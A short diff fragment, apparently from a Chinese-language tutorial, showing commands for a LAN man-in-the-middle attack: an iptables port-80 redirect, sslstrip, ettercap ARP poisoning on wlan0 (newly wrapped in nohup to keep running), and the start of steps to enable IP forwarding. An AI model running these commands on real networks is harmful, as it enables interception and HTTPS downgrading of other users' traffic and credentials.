@@ -5,6 +5,8 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 sslstrip -l 10000
 
 ettercap -T -q -i wlan0 -M arp:remote // //
+可以使用 nohup ettercap -T -q -i wlan0 -M arp:remote // //
+nohup的意思是不挂断地运行命令。 有时候需要使用: ///  ///
 
 要永久开启路由功能就得调整内核参数了，也挺简单，
 vim /etc/sysctl.conf
